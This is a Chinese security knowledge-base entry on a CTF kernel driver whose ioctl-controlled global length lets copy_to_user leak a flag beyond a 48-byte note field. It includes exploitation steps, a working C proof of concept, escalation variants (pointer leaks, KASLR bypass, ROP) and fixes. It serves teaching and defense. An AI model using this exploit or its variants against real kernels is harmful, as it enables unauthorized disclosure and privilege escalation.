---
id: binary-pwn-kernel-ioctl-global-length-oob-read-flag
title: 内核驱动 ioctl 越界读：全局长度控制 copy_to_user 泄露相邻 flag
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-ioctl-oob-read-global-length
tags:
- pwn
- kernel
- ioctl
- oob-read
- info-leak
- copy_to_user
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V95
  verified_at: '2026-11-05T20:04:04+08:00'
  notes: 已对照原文 pwner_LEVEL8 与 14 张图核对：baby_ioctl 两个命令 0x4008BA00/0x4008BA01、全局 g_read_size、g_read_size>0x80 才 BUG、copy_to_user(v5,&g_blob,g_read_size)、init 中 note[48] 与 strscpy(g_blob.flag, flag_value)、设备 0600 均与原文及源码一致；设置 0x80 越界读 flag 的 PoC 与原文 exp 相同。未验证点：未编译/加载内核模块复跑；无版本区间（CTF 题）。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-ioctl-global-length-oob-read-flag/
draft: false
kb_aliases:
- ioctl 越界读
- 内核 OOB read
- copy_to_user 泄露
- 全局缓冲区越界
- babyioctl
---

## 一句话结论

驱动用第一个 ioctl 把用户提供的长度存入全局变量，第二个 ioctl 再按这个长度从全局结构体 `copy_to_user` 回用户；长度校验只挡住 `>0x80`，却没有按结构体字段边界截断，设置 `0x80` 就能把紧跟在提示字符串后面的 flag 字段一并读回用户态。

## 原理

- 全局缓冲区 `g_blob` 是一个结构体：`note[48]` 存放提示文本，`flag` 字段存放启动时通过模块参数传入的 flag；`baby_init` 会把 `flag_value` 用 `strscpy` 写入 `g_blob.flag`。
- 第一个 ioctl（如 `0x4008BA00`）执行 `copy_from_user(&g_read_size, arg, 8)`，把用户给的 8 字节长度写入全局 `g_read_size`。
- 第二个 ioctl（如 `0x4008BA01`）先检查 `g_read_size > 0x80` 就 `BUG()`，然后 `copy_to_user(user_ptr, &g_blob, g_read_size)`。这个检查只限制“总长度不超过 0x80”，而 `note` 只有 48 字节；flag 位于 `note` 之后、仍在 0x80 范围内，于是相对 `note` 发生越界读。
- `copy_to_user` 只按字节拷贝，不理解结构体字段边界；因此攻击者把 `g_read_size` 设为 0x80 即可一次性读回 `note` 与 `flag`。
- 该原语是内核信息泄露：在 CTF 中直接读出 flag；在真实内核漏洞中可用于泄露内核指针/栈 canary，为后续提权 ROP 做准备。

## 触发条件

- 设备节点对攻击者可见且可打开（如 `/dev/babyioctl` 被 chmod 600 给目标用户）。
- 驱动导出“设置长度”和“按长度读取全局缓冲区”两个 ioctl，且长度由用户控制。
- 全局缓冲区中敏感字段（flag、密钥、内核指针）位于读取起点之后、检查上限之内。
- 检查仅有上界（如 `>0x80`）而没有按字段/结构体实际大小截断。
- 目标内核未启用会阻止该读取的额外保护（如针对该设备的 LSM/seccomp），或 CTF 环境允许。

## 利用步骤

1. 逆向驱动/查看源码，定位 ioctl 命令号、全局缓冲区结构与 `copy_to_user`/`copy_from_user` 调用。
2. 确认敏感字段相对全局缓冲区起点的偏移，以及长度检查的上界；选择一个能覆盖该字段的值（示例 0x80）。
3. 打开设备，先调用 SET ioctl 把 `size=0x80` 写入全局变量。
4. 分配用户缓冲区，调用 READ ioctl，把指向用户缓冲区的指针作为参数传入；内核按 0x80 字节拷贝 `g_blob`。
5. 在用户态打印/解析缓冲区，从 `note` 之后的偏移处提取 flag 或泄露的内核数据。

## PoC

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/babyioctl"
#define CMD_SET  0x4008ba00UL
#define CMD_READ 0x4008ba01UL

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    uint64_t size = 0x80;                 /* 覆盖 note 之后的 flag 字段 */
    if (ioctl(fd, CMD_SET, &size) < 0) { perror("ioctl set"); return 1; }

    unsigned char buf[0x100] = {0};
    void *ptr = buf;
    if (ioctl(fd, CMD_READ, &ptr) < 0) { perror("ioctl read"); return 1; }

    write(1, buf, 0x80);
    write(1, "\n", 1);
    return 0;
}
```

## 变体与关联

- 变体：把 SET 的长度设为负数/极大值，若检查缺失可造成更大的越界读甚至 `copy_to_user` 失败后的信息差异。
- 变体：从栈上全局/堆对象越界读泄露内核指针（如 `seq_operations`、`tty_struct`），结合 KASLR 绕过做后续 ROP 提权。
- 变体：OOB read 与 OOB write 成对出现时，可先读 canary/指针再写返回地址。
- 关联：[[binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack]]（内核 UAF 提权）、[[binary-pwn-kernel-cve-2026-31431-page-cache-poisoning-lpe]]（另一类内核信息泄露/提权链）。

## 检测与防御

- 检测：审计 ioctl 中长度参数与 `copy_to_user`/`copy_from_user` 的边界；对设备节点访问和异常长度的 ioctl 做审计日志；内核开启 KASAN/KFENCE 可在开发期发现越界。
- 修复：长度限制必须按目标字段/结构体的真实大小截断（如 `min(size, sizeof(g_blob.note))`）；敏感字段不要与可读缓冲区放在同一结构体相邻位置。
- 加固：设备节点最小权限（600）、仅授权用户可打开；`kptr_restrict`/`dmesg_restrict`；对含密钥的全局对象使用独立分配并清零；启用 KASLR/SMEP/SMAP。
